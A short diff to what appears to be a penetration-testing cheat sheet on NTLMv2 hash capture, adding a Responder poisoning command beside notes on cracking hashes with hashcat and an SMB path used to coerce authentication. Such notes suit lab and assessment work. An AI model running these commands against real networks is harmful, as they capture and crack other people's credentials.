@@ -20,6 +20,10 @@
 
 >We can now save these hashes in a file hash.txt and use hashcat to crack it. Please note that module number 5600 is the one suited to crack NTLMv2. If you obtained some other version of NTLM, please follow the hashcat modules here to specify the correct one.
 
+##### Responder
+```
+sudo responder -I tun0 -fv
+```
 ##### SMB 
 ```
 \\IPv4 address\test || //ip/test
